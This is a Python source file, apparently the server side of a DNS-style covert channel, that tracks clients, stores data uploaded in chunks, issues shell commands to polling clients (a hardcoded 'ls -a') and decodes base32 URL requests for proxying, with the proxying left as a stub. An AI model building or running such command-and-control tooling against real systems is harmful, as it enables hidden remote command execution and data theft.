from enum import Enum, auto
from datastorage import ClientStorage
from random import randint
import base64
import binascii


class StateEnum(Enum):
    IDLE = 'idle'
    RECEIVING_DATA = 'receiving_data'
    RECEIVING_REQUEST = 'receiving_request'
    SENDING_DATA = 'sending_data'
    REQUESTING_SHELL = 'requesting_shell'


class TransmissionTypeEnum(Enum):
    DATA = 'data'
    SHELL = 'shell'


class TransmissionState:

    def __init__(self, data: str, transmission_type: TransmissionTypeEnum):
        self._data = f"{transmission_type.name} {data}"

    def get_next_data(self):
        next_data = self._data[:255]
        self._data = self._data[255:]

        return next_data


class ServerState:

    __NEXT_CLIENT_ID = 1

    def __init__(self):
        self.__state = {}
        self.__storage = {}
        self.__transaction_ids = []

    def request_id_response(self):
        c_id = self.__NEXT_CLIENT_ID
        self.__NEXT_CLIENT_ID += 1
        self.__state[c_id] = {'state': StateEnum.IDLE,
                              'transmission': None,
                              'request': b""}
        self.__storage[c_id] = ClientStorage(c_id)

        return f"10.{randint(1,255)}.{randint(1,255)}.{c_id}"

    def is_new_transaction(self, transaction_id: int):
        is_new = not (transaction_id in self.__transaction_ids)
        if not is_new:
            self.__transaction_ids.append(transaction_id)

        return is_new

    def data_response(self, client_id: int, data: str, is_head: bool, done: bool = False):

        self.__state[client_id]['state'] = StateEnum.RECEIVING_DATA
        if is_head:
            self.__storage[client_id].store_head(data)
        else:
            self.__storage[client_id].store_body(data, done)

        return f"{randint(11,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}"

    def poll_response(self, client_id: int):
        # TODO: read from file
        shell_command = 'ls -a'
        self.__state[client_id]['state'] = StateEnum.REQUESTING_SHELL
        self.__state[client_id]['transmission'] = TransmissionState(shell_command, TransmissionTypeEnum.SHELL)

        return self.__state[client_id]['transmission'].get_next_data()

    def continue_response(self, client_id: int):
        response = self.__state[client_id]['transmission'].get_next_data()

        if not response:
            self.__state[client_id]['state'] = StateEnum.IDLE
            self.__state[client_id]['transmission'] = None

        return response

    def curl_response(self, client_id: int, webpage: str, done: bool):
        self.__state[client_id]['request'] += webpage

        if done:
            try:
                requested_url = base64.b32decode(self.__state[client_id]['request']).decode('utf-8')
                # TODO: curl
                curl = f"I'm curling {requested_url}"
            except binascii.Error:
                curl = "ENCODING ERROR"

            self.__state[client_id]['state'] = StateEnum.SENDING_DATA
            self.__state[client_id]['request'] = b""
            self.__state[client_id]['transmission'] = TransmissionState(curl, TransmissionTypeEnum.DATA)

            return self.__state[client_id]['transmission'].get_next_data()
        else:
            self.__state[client_id]['state'] = StateEnum.RECEIVING_REQUEST

            return "NOTHING"

    def dump_latest_storage(self):
        for c_id, storage in self.__storage.items():
            print(f"----- {c_id}-----")
            print("")
            storage.print_latest_storage()
            print("")
